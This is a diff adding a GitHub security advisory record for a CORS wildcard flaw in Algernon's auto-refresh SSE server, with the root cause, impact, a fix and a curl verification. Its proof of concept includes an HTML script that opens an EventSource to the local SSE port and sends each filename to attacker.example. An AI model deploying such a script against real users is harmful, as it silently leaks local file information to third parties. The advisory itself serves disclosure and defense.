@@ -1,0 +1,138 @@
+advisory_id: GHSA-hw27-4v2q-5qff
+datasource_id: github_osv/GHSA-hw27-4v2q-5qff
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-hw27-4v2q-5qff/GHSA-hw27-4v2q-5qff.json
+aliases:
+  - CVE-2026-46431
+summary: |
+  Algernon: Auto-refresh SSE event server sets Access-Control-Allow-Origin: *
+  ### Summary
+
+  The SSE event server's `Access-Control-Allow-Origin` response header was hardcoded to the wildcard `*` regardless of the caller's `Origin`. Because `EventSource` does not preflight and does not send cookies, the wildcard is sufficient to let any third-party page the developer visits open a cross-origin `EventSource` to the SSE port and read the live filename stream from JavaScript. Combined with the lack of authentication (advisory #2a), no further trickery is required — any tab the developer opens has script-level read access to the stream.
+
+  This advisory covers the CORS configuration in isolation. The fix is independent of authentication and bind-address fixes: the wildcard could be replaced with a same-origin echo without touching either.
+
+  ### Details
+
+  #### Root cause — hard-coded `"*"` passed as the CORS allowed-origin
+
+  ```go
+  // engine/config.go  (1.17.6, MustServe)
+  recwatch.EventServer(absdir, "*", ac.eventAddr, ac.defaultEventPath, ac.refreshDuration)
+  ```
+
+  The literal `"*"` is the second positional argument. The vendored `recwatch` implementation reflects it verbatim into the response header:
+
+  ```go
+  // vendor/github.com/xyproto/recwatch/eventserver.go:100-108  (1.17.6)
+  func GenFileChangeEvents(events TimeEventMap, mut *sync.Mutex, maxAge time.Duration, allowed string) http.HandlerFunc {
+      return func(w http.ResponseWriter, _ *http.Request) {
+          w.Header().Set("Content-Type", "text/event-stream;charset=utf-8")
+          w.Header().Set("Cache-Control", "no-cache")
+          w.Header().Set("Connection", "keep-alive")
+          w.Header().Set("Access-Control-Allow-Origin", allowed)
+          ...
+      }
+  }
+  ```
+
+  There is no decision based on the request's `Origin` header, and no allow-list mechanism — every caller is told their origin is approved.
+
+  #### Why the wildcard is exploitable
+
+  `EventSource` opens a `GET` request, never sends a preflight, and never carries cookies. The same-origin policy normally still blocks the response body from being read by JavaScript at a different origin — that is the role of `Access-Control-Allow-Origin`. When the server returns `*`, the browser permits the cross-origin script to read every `message` event.
+
+  So a developer running `algernon -a` on their workstation, with the SSE listener at `http://127.0.0.1:5553/sse` (Windows) or `http://0.0.0.0:5553/sse` (Linux/macOS), only needs to visit *any* third-party origin in another tab for the following to drain their stream silently:
+
+  ```html
+  <!doctype html>
+  <script>
+    const s = new EventSource('http://127.0.0.1:5553/sse');
+    s.onmessage = e => fetch('https://attacker.example/log?f=' + encodeURIComponent(e.data));
+  </script>
+  ```
+
+  The exploit is cookie-less and CORS-clean — no SameSite, no third-party-cookie restriction, no preflight challenge applies. The user interaction is "visit a webpage," which `UI:R` in the CVSS vector reflects.
+
+  ### PoC (against 1.17.6)
+
+  ```bash
+  # 1. Operator: algernon -a /path/to/project  on Windows; SSE at localhost:5553
+  # 2. Attacker lures the developer to https://news.example:
+  #    The page contains the snippet above.
+  # 3. EventSource opens, browser sends the request; algernon responds with
+  #    Access-Control-Allow-Origin: *, browser passes message events to the
+  #    cross-origin script; script ships filenames to attacker.example.
+  ```
+
+  CLI reproduction of the header is identical to advisory #2a's transcript; the relevant evidence is the `Access-Control-Allow-Origin: *` value in the response, not the body.
+
+  ### Impact
+
+  - **Confidentiality:** medium. Cross-origin browser-tab read access to the file-change stream, with no server-side knowledge that the read happened.
+  - **Integrity:** none.
+  - **Availability:** none directly (the cross-origin tab does not exhaust resources beyond the user's own browser).
+
+  ### Suggestions to fix
+
+  **Primary fix — echo a same-origin allow-list instead of `*`.**
+
+  ```go
+  // vendor/github.com/xyproto/recwatch/eventserver.go -- in GenFileChangeEvents
+  origin := r.Header.Get("Origin")
+  if !isAllowedOrigin(origin) {
+      http.Error(w, "forbidden", http.StatusForbidden)
+      return
+  }
+  w.Header().Set("Access-Control-Allow-Origin", origin)
+  w.Header().Set("Vary", "Origin")
+  ```
+
+  The `allowed` parameter must change from `"*"` to an explicit allow-list (or a single canonical server origin) — for example, `sseScheme + "://" + ac.serverAddr`. With the server's own scheme+host+port in `Allow-Origin`, a cross-origin request from `evil.example` is rejected by the browser because the response advertises a different origin.
+
+  **Defence in depth — drop the legacy dedicated-port code path.** Mounting the SSE handler on the main mux instead lets the response omit `Access-Control-Allow-Origin` entirely (same-origin only by default). The dedicated `--eventserver`-style path is the only place `Access-Control-Allow-Origin` is set in the codebase; removing the dedicated path simplifies the surface.
+
+  ### Live verification
+
+  ```
+  $ ./algernon.exe --nodb --httponly --server -a --addr 127.0.0.1:18779 --quiet poc2/site
+  $ ( curl -sNi --max-time 2 -H "Origin: http://evil.example" http://127.0.0.1:5553/sse > sse.txt &
+      sleep 1
+      echo "trigger" >> poc2/site/probe.txt
+      wait )
+  $ cat sse.txt
+  HTTP/1.1 200 OK
+  Access-Control-Allow-Origin: *
+  Cache-Control: no-cache
+  Connection: keep-alive
+  Content-Type: text/event-stream;charset=utf-8
+  ...
+  id: 0
+  data: C:\Users\xbox\Desktop\VulnTesting\algernon-main\poc-test\poc2\site\probe.txt
+  ```
+
+  The `Origin: http://evil.example` request header was echoed back as `Access-Control-Allow-Origin: *` (the wildcard — browsers treat this as "any origin may read"). A cross-origin tab at any URL can run `new EventSource("http://<algernon>:5553/sse")` and read the stream.
+impacted_packages: []
+severities:
+  - score: '4.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-hw27-4v2q-5qff/GHSA-hw27-4v2q-5qff.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-942
+references:
+  - url: https://github.com/xyproto/algernon
+    reference_type:
+    reference_id:
+  - url: https://github.com/xyproto/algernon/security/advisories/GHSA-hw27-4v2q-5qff
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-46431
+    reference_type:
+    reference_id:
+exploits: []
